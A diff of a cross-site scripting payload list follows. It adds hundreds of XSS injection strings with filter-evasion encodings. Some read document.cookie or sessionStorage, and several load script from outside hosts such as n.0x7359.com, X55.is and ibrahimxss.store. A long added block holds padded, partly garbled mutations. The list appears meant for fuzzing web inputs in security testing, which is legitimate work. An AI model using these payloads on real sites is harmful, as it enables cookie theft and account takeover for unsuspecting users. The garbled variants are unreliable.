@@ -1,6 +1,5 @@
 #<script>alert(1)</script>
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
-"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
 #javascript:alert(2);
 "><svg onload=alert(1)>
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
@@ -13,32 +12,89 @@ alert##<script>prompt(1234)</script>
 <DIV+STYLE="background-image: url(javascript:alert(1))">
 <IMG+DYNSRC="javascript:alert(1);">
 IMG+LOWSRC="javascript:alert(1);">
+<img+border=3+alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm('Hassan')//&gt;\x3e>
+<img//////src=x oNlY=1 oNerror=alert('xxs')//
+<!-- --!><script>alert(1)</script>
+document[cookie]
+<A HRef=//ibrahimxss.store AutoFocus %26%2362 OnFocus%0C=import(href)> 
+alert(cookie)
+alert()
+%61lert();
 <img src=asdf onerror=alert(JSON.stringify(sessionStorage))>
+<%73vg onlo%61d=%61lert('xss0r')>
 <iframe src="javascript:alert(document.domain)"></iframe>
+xss%27);}}});alert(document.cookie);$(function+a(){a();});$(function+a(){if(a){}else+if(a){/*///
 /me/m%3C/script%3E%3Csvg/onload=prompt(document.domain)%3E
 <isindex+type=image+src=1+onerror=alert(1)>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle​=&#x0000000000061;lert&#x000000028;origin&#x000029;> 
+--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(document.domain)%3C/scRipt%3E
 <img src=x onerror="alert(origin)">
+"><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
+"><form+onformdata=window.confirm(document.cookie)><!--
+logout.php?callback=<script>alert()</script>%0aTEST
+sm"*alert(1)*"
+javascript​:parent[/al/.source+/ert/.source](document.domain)
+callback=<script>alert()</script>%0aTESTž
+javascript:alert('XSS')
+1\/confirm?.(1)/\
+1%27/confirm?.(1)/%27
 "*alert(1)*"
+1'/confirm?.(1)/'"
 ibro"*alert(1)*"
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+"onclick​=prompt(8)><svg/onload​=prompt(8)>" 
+PHNjcmlwdD5hbGVydCgiZG9jdW1lbnQuZG9tYWluIik8L3NjcmlwdD4=
 alert?.(1) 
 <script>eval('al'+'ert(1)');</script>
+“;alert(1)/
+aaaa “;alert(1)/
+<img src=x onerror=alert&#40document.domain&#41>
 'alert(1)'.replace(/.+/,eval)
 <img src/onerror=alert(1)>
+#'%22/onmouseover=alert(document.domain)//
+onmouseover=alert(document.domain)//
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+1"*%2Fconf%0Cirm%0B(1)<%0C%2FScript%2F--%0C><%0CScript>%2F*
+1"*/confirm(1)</Script/--><Script>/*
+test<img src=a onerror​=window['alert'](window['document']['cookie']);>test
 <img onfocus=alert(1) autofocus tabindex=1>	
 <p onfocus=alert(1) autofocus tabindex=1>	
 <form onfocus=alert(1) autofocus tabindex=1>	
 <svg onfocus=alert(1) autofocus tabindex=1>	
 <wbr onfocus=alert(1) autofocus tabindex=1>	
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022<​script>alert("ibro")<​/script>\u0022\u003e
 <hgroup onfocus=alert(1) autofocus tabindex=1>	
+<input onmouseover=alert(1)>
 <ul onfocus=alert(1) autofocus tabindex=1>	
 <video onfocus=alert(1) autofocus tabindex=1>	
+<svg onload​=alert&#0000000040document.cookie)>
+<details/open/ontoggle​=confirm('XSS')>
+;'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->
+<svg onload​='new Function*["Y000!"].find(al\u0065rt)*'>
+"><body/oNpagEshoW​=(prompt)()>
+"><body/oNpagEshoW​=(prompt)(document.domain)>
+"><script>alert('ibrahimxss')</script>
+%2522%253e%253cscript%253ealert%2528%2527BUG XSS By Wildan!%2527%2529%253c%252fscript%253e
+"><input/onfocus​=(confirm)(document.domain)>
+"><body/oNpagEshoW​=(confirm)(document.domain)>
+"><body/onfocus​=(confirm)(document.domain)>
+"><Body/oNpagEshoW​=(prompt)(1)>
+<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
+<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
+img src='#' onerror='alert(1)'>">
+<svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+%22%3E%3Csvg%2Fonload=confirm(document.cookie)%3E 
 <mark onfocus=alert(1) autofocus tabindex=1>	
 <h1 onfocus=alert(1) autofocus tabindex=1>
 <xss onfocus=alert(1) autofocus tabindex=1>
 <body onhashchange="print()">	
 <plaintext onfocus=alert(1) autofocus tabindex=1>	
 <video controls src=1 onfocus=alert(1) autofocus>	
+xss0r\"-alert(1)}//
+<video src="#" controls onwebkitplaybacktargetavailabilitychanged="alert(1)"></video> 
 <svg><image href=1 onerror=alert(1)>	
+&𝐥𝐭;𝐢𝐦𝐠<> 𝐬𝐑𝐂=𝐱 𝐎𝐧𝐄<>𝐫𝐫𝐎𝐫=𝐚𝐥<>𝐞𝐫𝐭(1)> 
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 <audio src/onerror=alert(1)>	
 <ol onfocus=alert(1) autofocus tabindex=1>	
 <image2 onfocus=alert(1) autofocus tabindex=1>	
@@ -47,7 +103,6 @@ alert(document['cookie'])
 <svg/onload=parent[/al/.source.concat(/ert/.source)] (2)>
 "><img src=x onafterprint=prompt(document.domain);>
 <img onerror=eval('al&#x5c;u0065rt(1)') src=a>
-"><div onpointerrawupdate="console.log('XSS')">Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_ClickHere</div>
 "><div onpointerrawupdate="console.log('XSS')"></div><!--
 <video onloadstart=alert()><source></*>
 <xss draggable="true" ondragexit-alert()>test</xss>
@@ -55,25 +110,48 @@ alert(document['cookie'])
 "aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click"
 "><form onformdata=window.confirm(document.cookie)><!--
 a'-alert(1)//
+'/alert(1)//
 ';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//
 ';alert(document.cookie)//
 <svg/onload​=alert/*1337*/(1)>
 <svg/onload​=alert//&NewLine;(2)>
 <svg/onload​=alert&sol;**&sol;(3)>
+&lt;script>alert(document.cookie)&lt;/script>
 <svg/onload​=alert/&#42;&#42;/(4)>
 <svg/onload​=alert&#x2F;**&#47;(5)>
+'-confirm?.(1);function+myObj(){}'
+"' OnError=(confirm)(1) <!--><Img Src='
+#Data:,<Img/Src/OnError=(confirm)(1)>
+}/confirm?.(1)//%5C
+"'<!--><Img/Src/OnError=(confirm)(1)>"shadowpentesting@gmail.com
+%27)/confirm?.(1);function+myObj(){};function+atob(){confirm?.(1)}//
+<Script /Src=https://X55.is?1=18369></Script>
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=18369/.source))//>
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=18369/.source))}//\76-->
 confirm?.(1) 
 ignition/scripts/--><svg%20onload=alert%28document.domain%29>
 <svg%20onload=alert%28document.domain%29>
 <script ~~~>alert(0%0)</script ~~~>
 "ontouchend%3Dprompt%281%29+class%3Dd3rk+
+`'%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
 "><svg onScroll="javascript:alert(1)//
+<x \'=\"foo\"><x foo=\'><img src=x onerror=javascript:alert(1)//\'>
+\">%0D%0A%0D%0A<x \'=\"foo\"><x foo=\'><img src=x onerror=javascript:alert(`cloudfrontbypass`)//\'>
+`\"\'><img src=\'#\\x27 onerror=javascript:alert(1)>
+<! foo=\"[[[Inception]]\"><x foo=\"]foo><script>alert(1)</script>\">
+<! foo=\"[[[x]]\"><x foo=\"]foo><script>alert(91)</script>\">
 "<!--><Svg OnLoad=confirm?.(/d3rk😈/)<!--1")"<!--><Svg+OnLoad=confirm?.(/d3rk😈/)<!--
 %22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--
 url=%26%2302java%26%23115cript:alert(document.domain)
 %26%2302java%26%23115cript:alert(document.domain)
 ">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta
 “><iMg SrC=x onError​=prompt()>
+\" onload=prompt(1)>
+<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\
+<sVg OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div\"> \n
+<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>\n
+<details/open/ontoggle=\"self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];\">
 "><​script>prompt()<​/script>
 <Svg On Only=1 Onload=alert("hex")>
 "><script>alert(document.cookie)</script>
@@ -84,6 +162,8 @@ url=%26%2302java%26%23115cript:alert(document.domain)
 <IFRAME SRC="javascript:alert(document.cookie);"></IFRAME>
 <!</textarea <body onload='alert(1)'>
 <INPUT+TYPE="IMAGE"+SRC="javascript:alert(1);">
+</script><script>alert(9)</script>
+</script ><script>alert(9)</script><script>
 themecolor=%22-alert('XSS')-%22
 <STYLE>li+{list-style-image:url("javascript:alert(1)");}</STYLE><UL><LI>
 "><a>a</a><img src=x onerror=alert(document.cookie)>{{9-9}}';alert(0);://
@@ -94,6 +174,437 @@ themecolor=%22-alert('XSS')-%22
 <img/src/onerror="window[`al+/e/[`ex + `ec`]`e`+`rt`](2)">
 <img/src/onerror="this.ownerDocument.defaultView['\u0061lert'](4)">
 <iframe src-doc="<svg onload=alert (1337)&nvgt;"></iframe>
+m3ez<Svg Only=1 OnLoad=prompt("Path\x20Injection\x20Reflected\x20XSS:","Supakiad\x205.\x20(m3ez)")>
+m3ez%3cSvg%20Only%3d1%20OnLoad%3dprompt("Path\x20Injection\x20Reflected\x20XSS:","Supakiad\x205.\x20(m3ez)")%3e
+m3ez%253cSvg%2520Only%253d1%2520OnLoad%253dprompt("Path%5cx20Injection%5cx20Reflected%5cx20XSS:", "Supakiad%5cx205.%5cx20(m3ez)")%253e
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(document.domain)%3E/
+"><a nope="%26quot;x%26quot;"onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+\’/alert(1)//
+‘; alert(1);
+‘|alert(1)|’
+‘}};alert(1);{{‘
+‘}alert(1);{‘
+“-alert(1)-”
+“}]}’;alert(1);{{‘
+alert\\`1\\`
+‘-alert(1)-’
+('+alert(1)+');;;;();
+('+alert(1)////)+')();
+'+alert(1)'+;;;;()
+////('+alert(1)+')();;;;;
+'////;+alert(1)+;;;;()
+(';+alert(1)+)::();
+("+alert(1)+')()
+////('+alert(1)+');;;;()
+('+alert(1)+')+;;;;;;
+'+alert(1)+')'::::()
+(';++++alert(1)////())
+('++alert(1)\\\\()
+(';alert(1)'+;;;;()
+//(';alert(1)+);;;;;()
+(';;;;alert(1)()+);;;;;
+';alert(1)//()+;;;;
+(;alert(1);;;);()
+';;;;alert(1)+'()
+('alert(1);;;;;)+()
+(';;;;alert(1)////)()
+.alert(1);;;;;
+//.alert(1);;;;;
+.;alert(1)////;
+::::.alert(1)();;;;;
+.alert////(1)////;
+.;;;;alert(1);;;;;
+\\.;alert(1);;;;;
+.alert(1);;;;
+.;alert(1)();;;;;
+.alert(1)::::;;;;
+;;;;;.alert(1);;;;
+;;;;.alert(1)()
+////;.alert(1);;;;;
+\\.;alert(1)////
+.alert(1)';;;;;
+;;;;alert(1)';;;;;
+.;;;;alert(1);;;;;()
+.alert(1);;;;;;
+.alert;;;;(1)();
+.alert(1);:::;;;;
+\'-alert(1);;;;////
+\'-alert(1):://
+\'-;;;;alert(1)////
+\\'-alert(1)////;;;;
+\'-alert;;;;(1)////
+\'-alert(1)//;;;;;;
+\'-;;;;alert(1)\\////
+\'-alert(1)//\\;;;;;
+;;;;\'-alert(1)////
+\'-alert(1);;;;;//
+\'-alert////(1)////
+\'-alert////;;;;(1)//
+\'-alert(1);;;;;
+\'-alert(1)::;:://
+\'-alert(1)//;;;;
+\'alert(1)//;;;;;
+\\\\\'-alert(1)//;;
+\'--alert(1)////;;;;
+\'alert;;;;(1);;;;
+#\'-alert(1)//;;;;
+#\'-alert(1);;;;//
+#\';;;;alert(1)////
+\\\\#\'-alert(1)//;;;;
+#\'-;;;;alert(1)//
+#\'-alert(1)//;;;;;;
+#\'-alert;;;;(1)////
+#\'-alert(1)//;;;;;;;
+#\'alert(1)////;;;;
+#\'alert(1)//;;;;;;;
+#\'-alert(1)////;;;;
+#\'alert////(1)//;;;;
+#\'-;;;;alert(1)//;;;;
+#\'alert(1)//;;;
+#\'-alert(1);;;;;
+#\'-alert(1)//::::
+#\'alert(1);;;;;
+#\'-alert(1)////;;;;;;
+'};;;;alert(1);;;;;{'
+'};;;;alert(1);;;;;;;;{'
+'};;;;alert(1){{;;;;
+'};;;;alert(1);;;{{}
+'};;;alert;;;;(1);{{}
+'};;;;alert////(1);;;{
+'};;;;alert////(1);;;;;{
+'};;alert(1);;;;;;;{
+'};;alert////(1){;;;;}
+';;;;;alert(1){};;;;
+'};;;alert(1);;;;{
+';;;;alert(1);;;;;{;;;;}
+'};;;alert;;;;(1);;;{
+'};;;;alert(1);;;;;;;
+';;;alert;;;;(1);{{;;
+';;;alert;;;;(1){{}}
+'};;;;alert(1);;;{}
+'}alert(1);;;;{;;;;}
+'};;;;alert(1);;;{{{
+'};;;;;alert(1);{{}
+#*/alert(1);;;;
+#*/alert(1)////;
+#*;;;;alert(1);;;;;
+#*::::alert(1);;;;;
+#*;;;;alert(1);;;;;;;
+#*/;;;;alert(1);;;;;
+#*/alert(1)();;;;;;;
+#*/alert(1);;;;;////
+#*/;;;;alert(1);;;;
+#*/alert(1);;;;;;;
+#*/alert(1);;;;::::
+#*;;alert(1);;;;;;;
+#*//alert(1);;;;;;;
+#*/;;;;alert(1)();;;;;
+#*alert(1)();;;;;;;
+#*/alert(1);;;;::::;
+#*/alert(1)::::;;;;
+\"-alert(1)};;;;//
+\"-;;;;alert(1)}//;;;;
+\"-alert(1)}////;;;;;;
+\"-;;;;alert(1)}////;;;;
+\"-alert(1)}//;;;;;;;
+\"-;;;;alert(1)}//;;
+\"-alert(1)};;;;//;;
+\"-alert(1)};;;;;;;////
+\"-alert;;;;(1)}////;;;;
+\"-alert(1)};:::////
+\"-alert(1)};;;;:::://
+\"-;;;;alert(1)}//;;;;;;
+\"-alert(1)};;;;;;;
+\"-alert;;;;(1)};;;;;;
+\";;;;alert(1)}////;;
+\"-alert;;;;(1)};;;;;
+\"-alert(1)}////::::
+\"-alert(1)};;;;;:::://
+\"-alert;;;;(1)}//;;;;;
+\";;;;alert(1)};;;;;;////
+alert(document.cookie);;;;;
+alert(document.cookie)////;;;;
+alert;;;;(document.cookie)::::;;;;
+;;;;alert(document.cookie)////
+alert(document.cookie);;;;
+alert////(document.cookie);;;;;
+alert(document.cookie)::::;;
+alert(document.cookie);;;;;;;;;
+alert;;;;(document.cookie)////
+;;;;alert////(document.cookie);;;;
+alert(document.cookie);:::;;;;
+alert;;;;document.cookie)::::;;
+;;;;alert(document.cookie);;;;;;;
+alert(document.cookie)////::::
+alert;;;;(document.cookie);;;;
+alert////(document.cookie);;;;;;;
+alert(document.cookie)';;;;;;;
+alert(document.cookie);;;;;;;
+alert;;;;document.cookie)////;
+alert(document.cookie);;;;;;;::::
+‘);alert(‘done’);var b=(‘
+‘);;;;;alert(‘done’);;;;;var b=(‘;;;;
+‘);alert(‘done’);;;;;var b=(‘////;;;;
+‘);;;;;alert(‘done’);var b;;;;=(‘::::;;;;
+‘);alert;;;;(‘done’);;;;;var b=(‘;;;;;;
+‘);;;;;alert(‘done’);;;;;var b;;;;=(‘
+‘);;;;;alert;;;;(‘done’);var b=(‘;;;;
+‘);alert;;;;(‘done’);;;;;var;;;;b=(‘;;;;
+‘);alert(‘done’);;;;;;;;;var b;;;;=(‘;;;;
+‘);;;;;alert(‘done’);;;;;var;;;;b=(‘;;;;;;
+‘);alert;;;;(‘done’);;;;;var;;;;b=(‘////;;;;
+‘);;;;;alert;;;;(‘done’);;;;;var;;;;b=(‘;;;;;;;
+‘);alert;;;;(‘done’);var;;;;b;;;;=(‘;;;;
+‘);;;;;alert(‘done’);;;;;var;;;;b;;;;=(‘;;;;;;
+‘);alert(‘done’);;;;;;;;;var;;;;b;;;;=(‘;;;;
+‘);;;;;alert;;;;(‘done’);;;;;var;;;;b;;;;=(‘;;;;
+‘);alert;;;;(‘done’);;;;;;;var;;;;b;;;;=(‘;;;;;;
+‘);alert(‘done’);;;;;;;var;;;;b;;;;=(‘////;;;;
+‘);;;;;alert;;;;(‘done’);;;;;;;var;;;;b;;;;=(‘;;;;;;
+‘);alert;;;;(‘done’);;;;;var;;;;b;;;;=(‘;;;;
+');;;;;alert('Humal');;;;
+');alert('Humal')////;;;;
+';;;;;alert('Humal')////
+');alert;;;;('Humal');;;;
+');;;;;alert('Humal');;;;;
+');alert('Humal');;;;;;;;
+');alert('Humal');;;;;////
+');;;;;alert('Humal')::::;;;;
+');;;;;alert;;;;('Humal');;;;;
+');;;;;alert('Humal')::::
+');;;;;alert('Humal');;;;;;;
+';;;;;alert('Humal');;;;;
+');;;;;alert('Humal');;;;;;;;
+');alert('Humal')////;
+');alert;;;;('Humal');;;;;;;
+');;;;;alert('Humal');;;;::::
+\\";;;;alert('Humal');////
+\\;;;;alert('Humal');;;;;//
+\\;;;;alert('Humal');;;;;;;
+\\\\;;;;alert('Humal');////
+\\";;;;alert('Humal')////;;;;
+\\";;;;alert('Humal');;;;;;;
+\\"alert('Humal');;;;;//
+\\\\;;;;alert('Humal');;;;;
+\\\\alert('Humal');;;;;;;
+\\";;;;alert('Humal')::::;;;;
+\\;;;;alert('Humal');;;;;
+\\";;;;alert('Humal');;;;////
+\\;;;;alert('Humal');;;;;;
+\\";;;;alert('Humal');;;;;;
+\\\\alert('Humal')////;;;;
+\\";;;;alert('Humal')////;;;;;;
+\\";;;;alert('Humal');;;;::::
+*/alert('HUMAL\n-HUMAL');;;;;////
+*/alert('HUMAL\n-HUMAL');;;;;//;;;;
+*/alert;;;;('HUMAL\n-HUMAL');;;;////
+*/alert('HUMAL\n-HUMAL');;;;;//;;
+*/;;;;alert('HUMAL\n-HUMAL');;;;;//
+*/alert('HUMAL\n-HUMAL')////;
+*/alert('HUMAL\n-HUMAL');;;;;;////
+*/alert;;;;('HUMAL\n-HUMAL');;;;;
+*/alert('HUMAL\n-HUMAL');;;;::::
+*/;;;;alert('HUMAL\n-HUMAL');;;;;;
+*/alert('HUMAL\n-HUMAL');;;;////
+*/alert('HUMAL\n-HUMAL')::::;;;;
+*/alert('HUMAL\n-HUMAL');;;;;;;;
+*/alert('HUMAL\n-HUMAL');;;;;;;
+*/alert('HUMAL\n-HUMAL');;;;;;
+*/alert;;;;('HUMAL\n-HUMAL')////;;
+*/alert('HUMAL\n-HUMAL')////::::
+');;;;;alert('Humal');;;;;var x=';;;;
+');alert('Humal');;;;;var x='////;;;;
+');alert('Humal');;;;;var;;;;x=';;;;
+');;;;;alert('Humal');;;;;var;;;;x=';;;;;;
+');alert('Humal')::::var;;;;x=';;;;
+');;;;;alert('Humal');;;;;var;;;;x=';;;;
+');alert('Humal');;;;;;;var;;;;x=';;;;
+');alert('Humal');;;;;;;;var;;;;x=';;;;;;
+');alert;;;;('Humal');;;;;;;var;;;;x=';;;;;;
+');;;;;alert('Humal');;;;;;;;var;;;;x=';;;;
+');alert('Humal');;;;;;;;var;;;;x=';;;;
+');alert;;;;('Humal');;;;;var;;;;x=';;;;
+');alert;;;;('Humal');;;;;;;;var;;;;x=';;;;;;
+');alert('Humal');;;;;var;;;;x='////;;;;
+');alert('Humal')::::var;;;;x=';;;;;;
+');alert('Humal');;;;;;;;var;;;;x=';;;;;;;
+');;;;;alert('Humal');;;;;;;;var;;;;x=';;;;;;;
+\\\\');alert(\'Humal\');;;;;var x=\'
+\\');;;;;alert(\'Humal\');;;;;var;;;;x=\'
+\\');alert(\'Humal\');;;;;var;;;;x=\'////;;;;
+\\');alert\'Humal\';;;;;var;;;;x=\';;;;;;
+\\\\');;;;;alert(\'Humal\');;;;;var;;;;x=\'
+\\');alert\'Humal\'////;;;;var;;;;x=\';;;;
+\\');alert\'Humal\';;;;;;var;;;;x=\'
+\\');alert\'Humal\';;;;;;var;;;;x=\'////
+\\\\');alert\'Humal\';;;;;;;;var;;;;x=\';;;;
+\\\\');alert\'Humal\'////;;;;var;;;;x=\';;;;;
+\\');alert\'Humal\';;;;;;;;var;;;;x=\'
+\\');alert\'Humal\'::::var;;;;x=\';;;;;;
+\\\\');alert\'Humal\';;;;;;;var;;;;x=\';;;;
+\\');alert\'Humal\'////;var;;;;x=\';;;;
+\\');alert\'Humal\';;;;;;;;var;;;;x=\';;;;;
+\\\\');alert\'Humal\'////;;;;var;;;;x=\';;;;;;
+\\');alert\'Humal\';;;;;;;var;;;;x=\'
+\\\\');alert\'Humal\';;;;;;;;var;;;;x=\';;;;;;
+/confirm(1)?.(1)//;;;;
+/confirm(1)?;;;;.(1)//;;;;
+/confirm(1)?.;;;;(1)////;;
+/confirm;;;;(1)?.(1)//;;;;
+/confirm(1)?.;;;;(1)//;;;;
+/confirm(1)?.;;;;(1)////
+/confirm(1)?;;;;.(1)////;;;;
+/confirm;;;;(1)?;;;;.(1)////;;;;
+/confirm(1)?::::.(1)////;;;;
+/confirm(1)?.;;;;.(1)////
+/confirm(1)?;;;;.(1)//;;;;;;
+/confirm;;;;(1)?.;;;;(1)////
+/confirm(1)?;;;;.(1)////;;
+/confirm(1)?::::.(1)////;;
+/confirm(1)?.(1)//;;;;;;
+/confirm(1)?::::.(1)//;;;;
+/confirm(1)?.;;;;(1)//;;;;;;;
+/confirm?.(1)//;;;;
+/confirm?.;;;;(1)////
+/confirm?.;;;;(1)//;;;;
+/confirm?.;;;;(1)//;;
+/confirm?;;;;(1)////;;;;
+/confirm?.(1)////;;;;
+/confirm?::::.(1)////;;;;
+/confirm?.(1)//;;;;;;
+/confirm?.;;;;(1)//;;;;;;
+/confirm?;;;;(1)//;;;;;;
+/confirm?.;;;;(1)////;;;;
+/confirm?.(1)//::::;;;;
+/confirm?.(1)//;;;;;;;
+/confirm?.(1)////;;;;;;
+/confirm?.;;;;(1)////;;;;;;;
+‘;;;;alert(123);;;;;t=’
+‘alert(123);;;;;t=’
+‘;;;;alert(123);;;;;t=’;;;;
+‘alert;;;;(123);;;;;t=’;;;;
+‘alert(123)::::t=’;;;;
+‘;;;;alert(123);;;;;t=’;;;;;;
+‘alert;;;;(123);;;;;t=’;;;;;;
+‘;;;;alert(123)::::t=’;;;;;;
+‘alert(123);;;;;t=’;;;;;;
+‘alert(123)::::t=’;;;;;;;
+‘alert(123);;;;;;;t=’
+‘alert;;;;(123);;;;;t=’;;;;;;;
+‘;;;;alert(123);;;;;t=’;;;;;;;
+‘alert(123);;;;;t=’;;;;;;;
+“;;;;alert(123);;;;;t=”
+“alert(123);;;;;t=”;;;;
+“;;;;alert(123);;;;;t=”;;;;
+“alert;;;;(123);;;;;t=”;;;;
+“alert(123)::::t=”;;;;;;
+“;;;;alert(123);;;;;t=”;;;;;;
+“alert(123);;;;;t=”;;;;;;
+“;;;;alert(123)::::t=”;;;;;;
+“alert(123)::::t=”;;;;;;;
+“alert;;;;(123);;;;;t=”;;;;;;
+“alert(123);;;;;t=”;;;;;;;
+“alert;;;;(123);;;;;t=”;;;;;;;
+“alert(123);;;;;;;t=”;;;;
+‘>alert(154)</script>;;;;<script/154=’;;;;
+‘>alert(154)</script><script////154=’;;;;
+‘;;;;>alert(154)</script><script/154=’;;;;;;
+‘>alert(154)::::</script><script/154=’;;;;;;
+‘>alert(154)</script><script;;;;154=’;;;;;;
+‘;;;;>alert(154)</script><script/154=’;;;;;;;
+‘>alert(154)</script><script/154=’;;;;;;;
+‘>alert(154)</script>;;;;<script/154=’;;;;;;
+‘>alert;;;;(154)</script><script/154=’;;;;;;
+‘>alert(154)::::</script><script/154=’;;;;;;;
+‘>alert(154)</script>;;;;<script/154=’;;;;;;;
+‘>alert(154)</script><script////154=’;;;;;;
+‘;;;;>alert(154)</script><script/154=’;;;;
+‘>alert(154)</script><script////154=’;;;;;;;
+\\\\'-alert(1)//;;;;
+\'-;;;;alert(1)//;;;;
+\'-alert;;;;(1)//;;;;
+\\\\'-alert(1)////
+\'-alert(1)//::::;;;;
+\'-alert(1)//;;;;;;;
+\'-alert(1);;;;;//;;;;
+\'-;;;;alert(1)//;;;;;;
+\'-alert(1)//;;;;::::
+\'-alert(1)////;;;;
+\\\\'-alert(1)//;;;;;;
+\'-alert;;;;(1)//;;;;;;
+\'/alert(1)//;;;;
+\'/alert(1);;;;;//
+\\\\'/alert(1)//;;;;
+\'/;;;;alert(1)//;;;;
+\'/alert;;;;(1)//;;;;
+\\\\'/alert(1)////
+\'/alert(1)//;;;;;;
+\'/alert(1)//::::;;;;
+\'/alert(1)//;;;;;;;
+\'/alert(1);;;;;//;;;;
+\'/;;;;alert(1)//;;;;;;
+\'/alert(1)//;;;;::::
+\'/alert(1)////;;;;
+\'/;;;;alert(1)////
+\\\\'/alert(1)//;;;;;;
+\'/alert;;;;(1)//;;;;;;
+\'-alert(1)////
+\'////-alert(1)////
+\'////-alert(1)////;;;;
+\\\'-alert(1)////
+\\\\\'-alert(1)////
+\\\'////-alert(1)////
+\'-alert(1)////;;;;;;
+\'\\\\-alert(1)////
+\'////-alert(1)\\\\\\\\
+\'\\\\\\\\-alert(1)\\\\\\\\
+\'-alert(1)////\\\\
+\\\'-alert(1);;;;;//;;;;
+\\\'////-alert(1)\\\\\\\\;;;;
+\'-alert(1)\\\\\\\\;;;;
+\\\\\'-alert(1)////;;;;;;
+\'////-alert(1);;;;////
+\'-alert(1);;;;////\\\\\\\\
+\'\\\\-alert(1)////;;;;
+\'////alert(1)////
+\'/alert(1)////
+\'/alert(1)////\\\\
+\\\'/alert(1)////
+\\\\\'/alert(1)\\\\\\\\
+\'/////alert(1)////
+\'\\\\alert(1)////\\\\
+\\\\\'/alert(1)////\\\\
+\'/alert(1)\\\\\\\\;;;;
+\'/////alert(1)////\\\\
+\\\'/alert(1)\\\\\\\\;;;;;;
+\\\'/alert(1)////;;;;;;
+\'////alert(1)\\\\\\\\;;;;
+\\\\\'/alert(1)////\\\\\\\\;;;;
+\'/////alert(1)\\\\\\\\;;;;
+\'/alert(1)////\\\\\\\\;;;;
+\'/alert(1)\\\\\\\\////
+\\\\\'/alert(1)////
+\'}alert(1);{////
+\\\'}alert(1);{////
+\\\'}alert(1);{////\\\\
+\'}alert(1);{////;;;;
+\'}alert(1);{\\\\\\\\;;;;
+\\\\\'}alert(1);{////
+\\\\\'}alert(1);{////\\\\
+\'}alert(1);{////;;;;;;
+\'}alert(1);{\\\\\\\\;;;;;;
+\\\\\'////alert(1);{////
+\\\\\'alert(1);{\\\\\\\\;;;;
+\'}alert(1);{////\\\\
+\\\\\'////alert(1);{\\\\\\\\
+\'}alert(1);{////\\\\\\\\
+\\\\\'alert(1);{////
+\'}alert(1);{\\\\\\\\////
+\\\\\'////alert(1);{\\\\\\\\;;;;;;
+\\\\\'alert(1);{////\\\\\\\\;;;;
+"%5c"><body%2fonload%3d%26lt%3b!--%26gt%3b%26%2310confirm(1)%3bprompt(%2fXSS%2f.source)>"%2c
+<svG/x=">"/oNloaD=confirm()// 
+" onfocus​="alert(1)" autofocus="
 &#60;body onload=alert('ibrahimxss')&#62;&#34;&#34;
 onpointerover=”alert(‘XSS’)
 jAvaScripT:(alert)`1`
@@ -112,6 +623,7 @@ oninput=”alert(‘XSS’)
 onsubmit=”alert(‘XSS’)
 onkeydown=”alert(‘XSS’)
 <img src=x:alert(alt) onerror=eval(src) alt=0>
+new Proxy({}, { get: () => alert(1) }).test();
 <img src=/ onerror=alert(1)>
 3Cscript%3Ealert(1)%3C%2Fscript%3E##1
 %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
@@ -149,16 +661,12 @@ xss:&#101;x&#x2F; *XSS*//*//pression(alert("XSS"))'>
 "<svg onload=alert (1)> " ;
